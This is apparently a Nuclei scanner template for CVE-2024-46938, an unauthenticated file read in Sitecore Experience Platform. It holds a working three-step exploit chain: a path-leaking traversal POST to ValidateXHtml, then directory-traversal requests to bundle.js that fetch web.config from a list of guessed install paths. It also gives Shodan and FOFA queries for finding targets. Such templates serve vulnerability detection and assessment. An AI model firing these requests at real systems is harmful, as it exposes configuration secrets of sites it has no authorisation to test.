flow: http(1) && http(2) && http(3)
http:
- host-redirects: true
  matchers:
  - internal: true
    part: location
    type: word
    words:
    - /sitecore/service/notfound.aspx
  method: GET
  path:
  - '{{BaseURL}}/-/media/doo-doo.ashx'
- extractors:
  - group: 1
    internal: true
    name: file_path
    regex:
    - Could not find a part of the path '([^']+)\\x\\x\.txt
    type: regex
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - Could not find a part of the path
  raw:
  - 'POST /-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.EditHtml.ValidateXHtml?hdl=a
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    __PAGESTATE=/../../x/x

    '
- matchers:
  - condition: and
    dsl:
    - contains(body, "<configuration>")
    - contains(content_type, "text/javascript")
    - status_code == 200
    type: dsl
  payloads:
    paths:
    - '{{file_path}}\'
    - C:\inetpub\wwwroot\sitecore\
    - C:\inetpub\wwwroot\sitecore1\
    - C:\inetpub\wwwroot\sxa\
    - C:\inetpub\wwwroot\XP0.sc\
    - C:\inetpub\wwwroot\Sitecore82\
    - C:\inetpub\wwwroot\Sitecore81\
    - C:\inetpub\wwwroot\Sitecore81u2\
    - C:\inetpub\wwwroot\Sitecore7\
    - C:\inetpub\wwwroot\Sitecore8\
    - C:\inetpub\wwwroot\Sitecore70\
    - C:\inetpub\wwwroot\Sitecore71\
    - C:\inetpub\wwwroot\Sitecore72\
    - C:\inetpub\wwwroot\Sitecore75\
    - C:\Websites\spe.dev.local\
    - C:\inetpub\wwwroot\SitecoreInstance\
    - C:\inetpub\wwwroot\SitecoreSPE_8\
    - C:\inetpub\wwwroot\SitecoreSPE_91\
    - C:\inetpub\wwwroot\Sitecore9\
    - C:\inetpub\wwwroot\sitecore93sc.dev.local\
    - C:\inetpub\wwwroot\Sitecore81u3\
    - C:\inetpub\wwwroot\sitecore9.sc\
    - C:\inetpub\wwwroot\sitecore901xp0.sc\
    - C:\inetpub\wwwroot\sitecore9-website\
    - C:\inetpub\wwwroot\sitecore93.sc\
    - C:\inetpub\wwwroot\
    - C:\inetpub\{{Hostname}}.sc\
    - C:\inetpub\{{FQDN}}.sc\
    - C:\inetpub\{{RDN}}.sc\
    - C:\inetpub\{{FQDN}}\
    - C:\inetpub\{{RDN}}\
    - C:\inetpub\{{Hostname}}\
    - C:\inetpub\{{Hostname}}.sitecore\
    - C:\inetpub\{{FQDN}}.sitecore\
    - C:\inetpub\{{RDN}}.sitecore\
    - C:\inetpub\{{Hostname}}.website\
    - C:\inetpub\{{FQDN}}.website\
    - C:\inetpub\{{RDN}}.website\
    - C:\inetpub\{{Hostname}}.dev.local\
    - C:\inetpub\{{FQDN}}.dev.local\
    - C:\inetpub\{{RDN}}.dev.local\
    - C:\inetpub\{{Hostname}}sc.dev.local\
    - C:\inetpub\{{FQDN}}sc.dev.local\
    - C:\inetpub\{{RDN}}sc.dev.local\
  raw:
  - 'GET /-/speak/v1/bundles/bundle.js?f={{paths}}sitecore\shell\client\..\..\..\web.config%23.js
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2024-46938
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:sitecore:experience_commerce:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-46938
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    epss-percentile: 0.3838
    epss-score: 0.00087
  description: 'An issue was discovered in Sitecore Experience Platform (XP), Experience
    Manager (XM), and Experience Commerce (XC) 8.0 Initial Release through 10.4 Initial
    Release. An unauthenticated attacker can read arbitrary files.

    '
  metadata:
    fofa-query: title="sitecore"
    google-query: intitle:"sitecore"
    max-request: 45
    product: experience_commerce
    shodan-query: http.title:"sitecore"
    vendor: sitecore
    verified: true
  name: Sitecore Experience Platform <= 10.4 - Arbitrary File Read
  reference:
  - https://www.assetnote.io/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x
  - https://nvd.nist.gov/vuln/detail/CVE-2024-46938
  severity: high
  tags: cve,cve2024,sitecore,lfi,rce
